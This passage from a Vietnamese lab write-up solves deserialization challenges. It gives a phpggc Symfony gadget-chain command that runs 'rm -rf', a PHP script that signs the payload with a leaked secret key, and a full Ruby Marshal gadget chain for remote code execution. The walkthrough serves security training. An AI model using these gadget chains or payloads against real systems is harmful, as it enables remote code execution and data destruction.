-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
-</span></span></code></pre></div><p></p>
-<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
-<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
-<p></p>
-<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
-<p></p>
-<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
-<pre tabindex="0"><code>&lt;?php
-$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
-$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
-$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);
-
-$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
-print_r($cookie);
-?&gt;
-</code></pre><p></p>
-<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
-<p></p>
-<p>Solved</p>
-<p></p>
-<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
-<h3 id="description-6">Description</h3>
-<blockquote>
-<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
-To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
-You can log in to your own account using the following credentials: wiener:peter</p>
-</blockquote>
-<h3 id="exploitation-2">Exploitation</h3>
-<p>Session cookie là một <code>Ruby deserialize Object</code></p>
-<p></p>
-<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
-.</p>
-<p>Script có nội dung như sau:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
-</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
-</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
-</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
-</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
-</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
-</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
-</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
-</span></span></code></pre></div><p></p>
-<p>Thay cookie và gửi request</p>
-<p></p>
-<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
-<p></p>
 ]]></description>
 </item>
 </channel>
